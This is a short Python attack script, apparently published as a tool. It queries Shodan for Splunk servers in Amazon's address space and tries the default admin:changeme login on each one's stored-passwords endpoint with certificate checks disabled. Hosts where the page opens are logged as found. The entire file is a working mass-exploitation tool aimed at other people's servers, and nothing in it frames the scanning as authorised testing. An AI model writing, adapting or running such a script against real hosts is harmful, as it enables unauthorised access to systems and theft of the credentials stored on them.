#!/usr/bin/env python
#
# splunk.py
# Search SHODAN for default splunk servers
#
# Author: random_robbie

import sys

import shodan
import requests
from requests.auth import HTTPBasicAuth
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Configuration
API_KEY = "Your SHODAN API KEY"
SEARCH_FOR = 'title:"splunkd" org:"Amazon.com"'
FILE = "/services/storage/passwords"
session = requests.Session()

def filter_result(str):
	return str.strip()

def grab_file (IP,PORT,FILE,TITLE):
	print("[*] Testing: "+IP+" on Port: "+PORT+"[*]\n")
	try:
		URL = "https://"+IP+":"+PORT+""+FILE+""
		headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0"}
		response = session.get(URL, headers=headers, timeout=15, verify=False, auth=HTTPBasicAuth("admin","changeme"))
		result = response.text
		if 'Unauthorized' not in result:
			if "<title>passwords</title>" in result:
				with open("./cfg/splunk.cfg", "a") as text_file:
					text_file.write(""+URL+" - "+TITLE+"\n")
				print("[*] Splunk... Found - "+TITLE+" [*]\n")
		else:
			print ("[*] Not Vulnerable [*]\n ")
	except KeyboardInterrupt:
		sys.exit("Ctrl-c pressed ...")
			
	except Exception as e:
		print(e)
		print("[*] Nothing Found on IP: "+IP+" [*]\n")
	



	
	
try:
        # Setup the api
		api = shodan.Shodan(API_KEY)

        # Perform the search
		result = api.search(SEARCH_FOR)

        # Loop through the matches and print each IP
		for service in result['matches']:
				IP = service['ip_str']
				PORT = str(service['port'])
				CC = service['location']['country_name']
				TITLE = service['title']
				grab_file (IP,PORT,FILE,TITLE)
except KeyboardInterrupt:
		sys.exit("Ctrl-c pressed ...")
				
except Exception as e:
		sys.exit('Error: %s' % e)
